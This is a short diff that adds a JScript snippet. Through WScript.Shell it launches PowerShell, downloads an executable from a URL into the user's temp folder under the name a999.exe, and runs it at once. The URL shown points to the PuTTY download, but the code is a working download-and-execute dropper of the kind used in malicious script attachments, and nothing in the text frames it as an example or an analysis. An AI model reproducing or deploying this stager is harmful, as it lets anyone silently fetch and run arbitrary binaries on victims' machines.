@@ -1,0 +1,7 @@
+urlLink = "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe";
+
+
+
+
+	var r = new ActiveXObject("WScript.Shell").Run("powershell   -noexit -command  cd $env:TEMP; $url = '"+urlLink+"' ;$file1 = $env:TEMP + '\\a999.exe';$WebClient = New-Object System.Net.WebClient;$WebClient.DownloadFile($url,$file1);  & $file1 ");
+	
